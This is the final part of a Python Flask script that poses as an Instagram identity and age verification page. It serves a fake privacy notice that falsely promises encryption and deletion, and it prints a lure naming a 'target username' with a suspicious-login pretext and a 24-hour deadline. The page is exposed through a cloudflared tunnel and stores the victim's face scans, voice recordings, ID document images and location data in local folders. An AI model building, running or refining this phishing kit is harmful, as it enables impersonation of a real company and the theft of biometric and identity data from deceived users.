                color: #405DE6; 
                margin-bottom: 30px;
            }
            h2 {
                color: #833AB4;
                margin-top: 30px;
                margin-bottom: 15px;
            }
            .container {
                background-color: #121212;
                padding: 30px;
                border-radius: 12px;
                border: 1px solid #363636;
            }
            ul {
                padding-left: 20px;
                margin: 15px 0;
            }
            li {
                margin-bottom: 10px;
                line-height: 1.5;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Instagram Age Verification Privacy Notice</h1>
            <p>This verification process is designed to ensure compliance with age restrictions and community safety standards.</p>
            
            <h2>Data Collection</h2>
            <p>We collect the following data during verification:</p>
            <ul>
                <li>Facial recognition data (temporary video scan with head movements)</li>
                <li>Voice sample (for authentication and liveness detection)</li>
                <li>ID document images (for age and identity verification)</li>
                <li>Location data (for regional compliance and security)</li>
                <li>Device information (for fraud prevention)</li>
            </ul>
            
            <h2>Data Usage</h2>
            <p>Your data is used solely for:</p>
            <ul>
                <li>Age verification and compliance</li>
                <li>Identity authentication and fraud prevention</li>
                <li>Regional content restrictions enforcement</li>
                <li>Account security enhancement</li>
            </ul>
            
            <h2>Data Retention</h2>
            <p>All verification data is automatically encrypted and permanently deleted within 30 days of successful verification completion.</p>
            
            <h2>Security Measures</h2>
            <ul>
                <li>End-to-end encryption for all data transmission</li>
                <li>Secure storage with industry-standard protocols</li>
                <li>Regular security audits and compliance checks</li>
                <li>No sharing with third parties for marketing purposes</li>
            </ul>
            
            <h2>Your Rights</h2>
            <p>You have the right to:</p>
            <ul>
                <li>Request access to your verification data</li>
                <li>Request deletion of your data before the 30-day period</li>
                <li>Opt-out of future verifications (may limit account functionality)</li>
                <li>File a complaint regarding data handling</li>
            </ul>
        </div>
    </body>
    </html>'''

if __name__ == '__main__':
    check_dependencies()
    
    # Get verification settings from user
    VERIFICATION_SETTINGS = get_verification_settings()
    
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4045
    script_name = "Instagram Verification Page"
    
    print("\n" + "="*60)
    print("INSTAGRAM VERIFICATION PAGE")
    print("="*60)
    print(f"[+] Target Username: @{VERIFICATION_SETTINGS['target_username']}")
    
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"[+] Profile Picture: {VERIFICATION_SETTINGS['profile_picture_filename']}")
    else:
        print(f"[!] No profile picture found")
        print(f"[!] Place any image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"[+] Data will be saved to: {DOWNLOAD_FOLDER}")
    print(f"[+] Face scan duration: {VERIFICATION_SETTINGS['face_duration']} seconds")
    if VERIFICATION_SETTINGS['voice_enabled']:
        print(f"[+] Voice verification: Enabled ({VERIFICATION_SETTINGS['voice_duration']} seconds)")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"[+] ID verification: Enabled")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"[+] Location verification: Enabled")
    print("\n[+] Folders created:")
    print(f"    - face_scans/")
    if VERIFICATION_SETTINGS['voice_enabled']:
        print(f"    - voice_recordings/")
    if VERIFICATION_SETTINGS['id_enabled']:
        print(f"    - id_documents/")
    if VERIFICATION_SETTINGS['location_enabled']:
        print(f"    - location_data/")
    print(f"    - user_data/")
    print("\n[+] Starting server...")
    print("[+] Press Ctrl+C to stop.\n")
    
    # Terminal prompt for user
    print("="*60)
    print("TERMINAL PROMPT FOR USER")
    print("="*60)
    print(f"Instagram is requesting identity verification for account:")
    print(f"👤 Username: @{VERIFICATION_SETTINGS['target_username']}")
    if VERIFICATION_SETTINGS.get('profile_picture'):
        print(f"🖼️  Profile: Using profile picture from account")
    else:
        print(f"👤 Profile: Default account avatar")
    print(f"📊 Stats: {random.randint(100, 999)} posts • {random.randint(1000, 9999)} followers • {random.randint(500, 5000)} following")
    print(f"🔒 Reason: Suspicious login attempt detected")
    print(f"⏰ Time limit: Complete within 24 hours")
    print(f"📍 Required: Face scan, ID verification, and location check")
    print("="*60)
    print("Open the link below in browser to start verification...\n")
    
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\n[+] Shutting down Instagram verification server...")
        sys.exit(0)